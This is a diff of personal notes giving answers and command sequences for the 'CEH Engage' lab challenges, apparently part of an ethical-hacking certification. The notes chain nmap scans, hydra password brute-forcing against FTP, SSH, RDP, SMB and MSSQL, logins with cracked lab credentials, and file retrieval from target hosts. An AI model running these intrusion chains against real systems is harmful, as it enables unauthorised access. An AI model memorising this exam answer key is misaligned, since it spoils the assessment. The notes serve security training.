@@ -1,7 +1,7 @@
 
 CEH Engage - Part I
 
-- C1: henry.ns.cloudflare.com
+- C1: (Analyze Dumpster.xlsx): henry.ns.cloudflare.com
 - C2 (nmap -sn 192.168.10.0/24 -> nmap -PU 192.168.10.0/24): 5
 - C3 (nmap -p 22 -O 192.168.10.0/24): 192.168.10.111
 - C4 (nmap -p 88,389 -oG 192.168.0.0/24): 192.168.0.222
@@ -9,11 +9,11 @@ CEH Engage - Part I
 - C6 (nmap -A 192.168.0.222): SKILL.CEH.com
 - C7 (nmap -p 22 -sV 192.168.10.0/24): 8.9p1
 - C8 (nmap -p 3306 -sV 172.30.10.0/24 && nmap -T4 -A 172.30.10.99): Ubuntu
-- C9 (nmap -sS -sV -T4 -A 192.168.10.0/24): 192.168.10.144
+- C9 (nmap -sV -T4 -A 192.168.10.0/24): 192.168.10.144
 - C10 (dig NS certifiedhacker.com): ns1.bluehost.com, ns2.bluehost.com
 - C11 (nmap -p 25 172.30.10.0/24): 172.30.10.200
 - C12 (nmap --script smb2-security-mode -p445 172.30.10.200): No
-- C13: 276
+- C13: (ChatGPT) 276
 - C14 (openvas): 70
 - C15 (openvas): FTP Unencrypted Cleartext Login
 
@@ -21,19 +21,19 @@ CEH Engage - Part I
 
 CEH Engage - Part II
 
-- C1 (nmap -p 21 --open 192.168.10.0/24 -> hydra -l nick -P rockyou.txt ftp://192.168.10.111): https://www.crushftp.com/
+- C1 (nmap -p 21 --open 192.168.10.0/24 -> hydra -l nick -P rockyou.txt ftp://192.168.10.111 -> ftp://192.168.10.111 (nick/apple) -> get 52012.py -> Vendor Homepage): https://www.crushftp.com/
 - C2 (wireshark filter: http.request.method == POST -> login attempts): kety/apple
 - C3
 - C4 (wireshark filter: udp): 192.168.10.144
 - C5 (wireshark tcp & udp port 111 & 135): 172.30.10.99
 - C6 (most income bytes from remote ip): 192.168.10.222
-- C7
+- C7 (): c3ll0@123
 - C8 (nmap -sn 192.168.10.0/24 -> nmap --script ms-sql* 192.168.10.144 -> hydra -L users.txt -P rockyou.txt 192.168.10.144 mssql -> mysqlclient.py Server_mssrv:Spidy@192.168.10.144 -> dir C:\Users\Public\Downloads\MSS.txt): 7
 - C9 (nmap -p 3389 -sV --open 192.168.10.0/24 -> hydra -l Maurice -P rockyou.txt rdp://192.168.10.222): Pumpkin@1234
 - C10 (hybrid-analysis.com -> SHA-256):  d282
 - C11 (Share in Win -> Process Monitor Microsoft Sysinternals -> Open logfile and Find H3ll0.exe -> Process -> Parent ID): 6952
-- C12
-- C13 (nmap -p 2002 --open -sV <target-subnet>): 192.168.10.144
+- C12 (Share Tornado.elf in Win ->  Open in Detect It Easy > Advanced > Entropy): 2.87903
+- C13 (nmap -p 2002 --open -sV 192.168.10.0/24): 192.168.10.144
 - C14 (steghide extract -sf stealth.jpeg -p azerty@123 -> Open hidden.txt and find value): 3965222
 - C15 (searchsploit AirDrop 2.0): android/dos/46445.c
 
@@ -44,11 +44,11 @@ CEH Engage - Part III
 - C1 (wireshark): 172.30.10.200
 - C2 (wireshark filter: http.request.method == POST -> login attempts): lee/test
 - C3 (Open cowrie.log): 172.30.10.99
-- C4 (nmap --script http-headers www.certifiedhacker.com)
+- C4
 - C5 (nmap -p 22 --open 192.168.10.0/24 -> hydra -l Martin -P rockyou.txt ssh://192.168.10.101 -> ssh Martin@192.168.10.101 -> type Desktop\$ollers.txt): i2tr&^72546HJ*
 - C6 (nmap -p 21 --open 192.168.10.0/24 -> hydra -l nick -P rockyou.txt ftp://192.168.10.111 -> ftp 192.168.10.111 -> cd Desktop -> get w_domain.txt -> cat w_domain.txt): 7867721010
-- C7 (nmap -p 8080 -sVC --open 172.30.10.0/24 -> Log4J): Ch@mp2022
-- C8 (nmap -p 139,445 192.168.10.101 -> hydra -L users.txt -P rockyou.txt 192.168.10.101 smb -> smbclient -L //192.168.10.101 -U Martin -> smbclient //192.168.10.101/Users -U Martin -> ls -> Mount smb share locally and find file -> cd Martin\Music\ -> get webpent.txt -> Open webpent.txt -> curl -sL www.moviescope.com): EC-Council
+- C7 (): Ch@mp2022
+- C8 (nmap -p 139,445 192.168.10.101 -> hydra -L users.txt -P rockyou.txt 192.168.10.101 smb -> smbclient -L //192.168.10.101 -U Martin -> smbclient //192.168.10.101/Users -U Martin -> ls -> Mount smb share locally and find file -> cd Martin\Music\ -> get webpent.txt -> Open webpent.txt -> Highlighted website: www.moviescope.com -> curl -sL www.moviescope.com): EC-Council
 - C9 (chatgpt): cross-site scripting (XSS)
 - C10 (chatgpt): Content Security Policy
 - C11
@@ -75,4 +75,4 @@ CEH Engage - Part IV
 - C12 (adb pull /sdcard/Music/confidential.txt): 80099889
 - C13 (adb pull /sdcard/Music/2024-09-11_11-52-05.png): 23
 - C14 (md5sum file.txt -> Compare hash with FileHashes.txt): Quotes
-- C15 (Share file in win -> Mount file MyVeracrypt in VeraCrypt - Win -> Open selected Drive in File Explorer and Count files):6
+- C15 (Share file in win -> Mount file MyVeracrypt in VeraCrypt - Win -> Open selected Drive in File Explorer and Count files): 6
